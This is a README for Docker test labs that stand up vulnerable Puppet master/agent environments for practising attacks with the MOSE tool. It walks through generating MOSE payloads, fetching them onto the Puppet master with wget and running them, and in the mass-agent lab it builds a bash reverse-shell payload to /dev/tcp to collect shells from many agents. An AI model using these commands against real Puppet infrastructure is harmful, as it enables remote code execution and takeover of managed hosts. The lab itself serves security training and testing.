# puppet-test-lab
Create test labs which can be used to play around with MOSE and Puppet.

**Warning, take heed: This lab should be run in a controlled environment, as it contains vulnerable assets.**

## Dependencies
You must download and install the following for this environment to work:
* [Docker](https://docs.docker.com/install/)
* [Docker Compose](https://docs.docker.com/compose/install/)
* [Python 3](https://www.python.org/downloads/release/python-374/)

## Basic Lab Build Instructions
To create an environment with a Puppet Master that controls a single agent with a simple hello world module, run the following command:
```
cd basic && make run
```

To run MOSE against it:
1. Build MOSE using `make build` in the MOSE repo
2. Generate a payload with MOSE: `./mose -c "touch /tmp/BLA && echo test >> /tmp/BLA" -t puppet`
3. Get it to the puppet master: `docker exec -it basic-puppetmaster wget http://YOURIPADDRESSGOESHERE:8080/puppet-linux`
4. Exec into the puppet master: `docker exec -it basic-puppetmaster bash`
5. Run the payload: `chmod +x puppet-linux; ./puppet-linux`
6. Wait for 30 minutes or exec into one of the agents and kick off the payload manually: `docker exec -it basic-puppetagent bash` and then run `puppet agent -t`
7. For this example, you should note that a file has been created in `/tmp` in the basic-puppetagent container, as we specified in step 2.


To tear down the basic lab, run the following command:
```
make destroy
```

## Mass Agent Lab Build Instructions
To create an environment with a Puppet Master that controls n number of agents, start by specifying the number of agents to create:
1. Open mass_puppet.py
2. Change `number_agents` to your desired number of agents. The counter starts at 2, so 21 agents actually yields 19.

Next, run the following command to stand up the environment:
```
cd mass_agents && make run
```

To run MOSE against the lab and get a ton of shells, do the following:
1. Build MOSE using `make build` in the MOSE repo
2. Download Platypus from here: https://github.com/WangYihang/Platypus/releases/tag/v1.1.0
3. Run Platypus using the instructions provided in the repo's README
4. Generate a payload with MOSE: `./mose -c "bash -i >& /dev/tcp/YOURIPADDRESSGOESHERE/8080 0>&1 &" -t puppet`
5. Get it to the puppet master: `docker exec -it massagents-puppetmaster wget http://YOURIPADDRESSGOESHERE:8080/puppet-linux
6. Exec into the puppet master: `docker exec -it massagents-puppetmaster bash`
7. Run the payload: `chmod +x puppet-linux; ./puppet-linux`

Back on the attackers system, kick off the agents by running: 
```
bash pwn.sh
```

To tear down the mass agent lab, run the following command:
```
make destroy
```

## Extended Lab Build Instructions
To create an environment with a Puppet Master that controls a prod and dev environment that include a web application, a mysql database, and various package installs, run the following command:
```
cd extended && make run
```

To run MOSE against it:
1. Build MOSE using `make build` in the MOSE repo
2. Generate a payload with MOSE: `./mose -c "touch /tmp/BLA && echo test >> /tmp/BLA" -t puppet`
3. Get it to the puppet master: `docker exec -it extended-puppetmaster wget http://YOURIPADDRESSGOESHERE:8090/puppet-linux`
4. Exec into the puppet master: `docker exec -it extended-puppetmaster bash`
5. Run the payload: `chmod +x puppet-linux; ./puppet-linux`
6. Wait for 30 minutes or exec into one of the agents and kick off the payload manually: `docker exec -it prodlaptop bash` and then run `puppet agent -t`
7. For this example, you should note that a file has been created in `/tmp` in the prodlaptop container, as we specified in step 2.

You can also target development systems by running `puppet agent -t --environment development` on the appropriate systems. 

This environment can be used for more interesting attack chains, such as targeted payloads specifically for the webservers, leveraging secrets to access a database, etc.

To tear down the extended lab, run the following command:
```
make destroy
```
